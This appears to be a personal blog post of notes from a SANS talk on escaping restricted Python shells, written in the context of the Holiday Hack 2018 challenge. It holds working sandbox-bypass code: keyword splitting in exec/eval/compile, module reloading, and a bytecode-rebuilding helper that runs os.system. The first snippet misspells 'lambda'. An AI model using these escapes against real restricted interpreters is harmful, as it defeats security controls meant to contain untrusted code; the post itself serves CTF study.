---
title: "Notes on Escaping Python Shells"
date: 2019-01-19T22:29:43-05:00
draft: false
toc: true
comments: true
categories:
- Python
---

During the [SANS Holiday Hack Challenge 2018]({{< relref "/post/2019-01-15-sans-holiday-hack-2018" >}} "SANS Holiday Hack Challenge 2018"), I viewed a talk by [Mark Baggett](https://twitter.com/markbaggett) about escaping Python shells. These are my notes.

* Talk: https://www.youtube.com/watch?v=ZVx2Sxl3B9c
* Code: https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499

It's part of [SANS SEC573: Automating Information Security with Python](https://www.sans.org/course/automating-information-security-with-python) which looks interesting. Although, I am Go fanatic and will probably will never be able to afford to course anyways. Creating a Go version of the course sounds fun.

<!--more-->

# Overwrite/Reload Python Modules
Overwrite them in memory:

``` python
import sys
sys.modules['os'].system = lamba *x,**y:"STOP HACKING"
del sys

# now if I want to run it
import os
os.system("ls")
# I get stop hacking
'STOP HACKING'
```

To defeat, we can reload them in Python 3 with `importlib`

``` python
import importlib
importlib.reload(os)
```

# Python as Child Process
Python interpreter is launched as a child process and then keywords are filtered with `readfunc()`.

## exec
Executes Python code that does not return a result. Break the statements into pieces and run them.

``` python
exec("imp" + "ort os")
os.system("id")
```

## eval
Executes Python code that returns a result.

``` python
os = eval('__im' + 'port__("os")')  # __import__("os")
os.system("id")
```

## compile
Takes turns a string into bytecode.

``` python
code = compile("im" + "port os", "", "single") # single means only compile this single line.

# now we need to execute it
# make a function that does nothing
def a():
    return

# and overwrite it
a.__code__ = code

# execute it
a()

# now os should be imported
os.system("id")
```

## exec, eval, import and compile are blocked
Go to a different Python interpreter, make the function you want

``` python
def bypass():
    import os
    print(os.system("id"))
```

Paste `make_object.py` from https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499#file-make_object-py this function into the 2nd interpreter:

``` python
import sys
def makeobject(afunction):
   print("Generating a function for version {}.{} (same version as this machine)".format(sys.version_info.major, sys.version_info.minor))
   newstr = ""
   newstr += "def a():\n"
   newstr += "   return\n\n"
   if sys.version_info.major == 2:
       co = afunction.__code__
       if sys.version_info.minor not in [5,6,7]:
           print("This code has not been tested on this version of python.  It may not work.")
       newstr += "a.__code__ = type(a.__code__)({0},{1},{2},{3},'{4}',{5},{6},{7},'{8}','{9}',{10},'{11}')".format( co.co_argcount, co.co_nlocals, co.co_stacksize, co.co_flags, co.co_code.encode("string_escape"),co.co_consts, co.co_names, co.co_varnames, co.co_filename, str(co.co_name), co.co_firstlineno, co.co_lnotab.encode("string_escape"))
   elif sys.version_info.major == 3:
       co = afunction.__code__
       if sys.version_info.minor not in [5]:
           print("This code has not been tested on this version of python.  It may not work.")
       newstr += "a.__code__ = type(a.__code__)({0},{1},{2},{3},{4},{5},{6},{7},{8},'{9}','{10}',{11},{12})".format( co.co_argcount, co.co_kwonlyargcount, co.co_nlocals, co.co_stacksize, co.co_flags, co.co_code,co.co_consts, co.co_names, co.co_varnames, co.co_filename, str(co.co_name), co.co_firstlineno, co.co_lnotab)
   else:
       print("This version of python is not tested and may not work")
   print(newstr)
```

Now call `makeobject(bypass)` to get the bytecode for it. It gives a string that can be copy/pasted into the remote system. It will create a function called `a` and then bytecode for it that does what `bypass` does. Might need to break the keywords into a string again (e.g. `"import"` to `"im" + "port"`).

Unsurprisingly, the challenge used this method. See my solution to [Python Escape from LA]({{< relref "/post/2019-01-15-sans-holiday-hack-2018/index.markdown#python-escape-from-la" >}} "Python Escape from LA").